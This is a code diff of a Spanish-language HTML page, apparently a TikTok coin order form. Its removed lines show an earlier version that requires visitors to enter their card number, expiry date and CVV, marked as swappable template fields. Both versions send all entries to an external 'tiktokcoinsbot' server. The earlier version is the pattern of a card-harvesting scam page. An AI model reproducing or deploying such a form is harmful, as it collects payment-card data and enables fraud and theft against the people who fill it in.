@@ -114,7 +114,6 @@ button:hover{
 type="text"
 id="usuario"
 placeholder="1. Nombre completo"
-required
 >
 
 <!-- PREGUNTA 2 -->
@@ -122,38 +121,34 @@ required
 <input
 type="text"
 id="tiktok"
-placeholder="2. numero de la tarjeta"
-required
+placeholder="2. Usuario de TikTok"
 >
 
-<!-- PREGUNTA 3 - PUEDES CAMBIARLA -->
+<!-- PREGUNTA 3 -->
 
 <input
 type="text"
 id="dato3"
-placeholder="3. Fecha de vencimiento:"
-required
+placeholder="3. Escribe aquí tu respuesta"
 >
 
-<!-- PREGUNTA 4 - PUEDES CAMBIARLA -->
+<!-- PREGUNTA 4 -->
 
 <input
 type="text"
 id="dato4"
-placeholder="4. codigo cvv"
-required
+placeholder="4. Escribe aquí tu respuesta"
 >
 
-<!-- PREGUNTA 5 - PUEDES CAMBIARLA -->
+<!-- PREGUNTA 5 -->
 
 <input
 type="text"
 id="dato5"
-placeholder="5. link de tik tok"
-required
+placeholder="5. Escribe aquí tu respuesta"
 >
 
-<!-- PREGUNTA 6 - MONEDAS, SIEMPRE LA ÚLTIMA -->
+<!-- PREGUNTA 6: MONEDAS -->
 
 <select id="monedas" required>
 
@@ -185,8 +180,6 @@ required
 
 </select>
 
-<!-- PRECIO AUTOMÁTICO -->
-
 <div class="precio" id="precio">
 💰 Precio: Selecciona un paquete
 </div>
@@ -202,6 +195,11 @@ CONTINUAR
 const monedasSelect = document.getElementById("monedas");
 const precio = document.getElementById("precio");
 
+
+// ==========================================
+// MOSTRAR PRECIO AUTOMÁTICAMENTE
+// ==========================================
+
 monedasSelect.addEventListener("change", function(){
 
     const opcion = this.options[this.selectedIndex];
@@ -214,7 +212,8 @@ monedasSelect.addEventListener("change", function(){
         return;
     }
 
-    const precioSeleccionado = opcion.dataset.precio;
+    const precioSeleccionado =
+        opcion.dataset.precio;
 
     precio.textContent =
         "💰 Precio: $" + precioSeleccionado + " USD";
@@ -222,85 +221,101 @@ monedasSelect.addEventListener("change", function(){
 });
 
 
-document.getElementById("pedidoForm").addEventListener("submit", async function(e){
+// ==========================================
+// ENVIAR FORMULARIO
+// ==========================================
 
-    e.preventDefault();
+document.getElementById("pedidoForm").addEventListener(
+    "submit",
+    async function(e){
 
-    const opcion =
-        monedasSelect.options[monedasSelect.selectedIndex];
+        e.preventDefault();
 
-    const datos = {
+        const opcion =
+            monedasSelect.options[
+                monedasSelect.selectedIndex
+            ];
 
-        usuario:
-            document.getElementById("usuario").value,
+        const datos = {
 
-        tiktok:
-            document.getElementById("tiktok").value,
+            usuario:
+                document.getElementById("usuario").value,
 
-        dato3:
-            document.getElementById("dato3").value,
+            tiktok:
+                document.getElementById("tiktok").value,
 
-        dato4:
-            document.getElementById("dato4").value,
+            dato3:
+                document.getElementById("dato3").value,
 
-        dato5:
-            document.getElementById("dato5").value,
+            dato4:
+                document.getElementById("dato4").value,
 
-        monedas:
-            opcion.value,
+            dato5:
+                document.getElementById("dato5").value,
 
-        paquete:
-            opcion.textContent.trim(),
+            monedas:
+                opcion.value,
 
-        precio:
-            opcion.dataset.precio,
+            precio:
+                opcion.dataset.precio,
 
-        metodo:
-            "Pendiente"
+            metodo:
+                "Pendiente"
 
-    };
+        };
 
 
-    try{
+        try{
 
-        const respuesta = await fetch(
-            "https://tiktokcoinsbot-production.up.railway.app/enviar",
-            {
-                method:"POST",
+            const respuesta = await fetch(
+                "https://tiktokcoinsbot-production.up.railway.app/enviar",
+                {
+                    method:"POST",
 
-                headers:{
-                    "Content-Type":"application/json"
-                },
+                    headers:{
+                        "Content-Type":"application/json"
+                    },
 
-                body:JSON.stringify(datos)
+                    body:JSON.stringify(datos)
+                }
+            );
+
+
+            if(respuesta.ok){
+
+                alert(
+                    "✅ Pedido enviado correctamente."
+                );
+
+                document
+                    .getElementById("pedidoForm")
+                    .reset();
+
+                precio.textContent =
+                    "💰 Precio: Selecciona un paquete";
+
+            }else{
+
+                alert(
+                    "❌ Error al enviar el pedido."
+                );
+
             }
-        );
 
+        }catch(error){
 
-        if(respuesta.ok){
-
-            alert("✅ Pedido enviado correctamente.");
-
-            document.getElementById("pedidoForm").reset();
-
-            precio.textContent =
-                "💰 Precio: Selecciona un paquete";
-
-        }else{
-
-            alert("❌ Error al enviar el pedido.");
+            alert(
+                "❌ No se pudo conectar con el servidor."
+            );
 
         }
 
-    }catch(error){
-
-        alert("❌ No se pudo conectar con el servidor.");
-
     }
-
-});
+);
 
 </script>
+
+</div>
 
 </body>
 
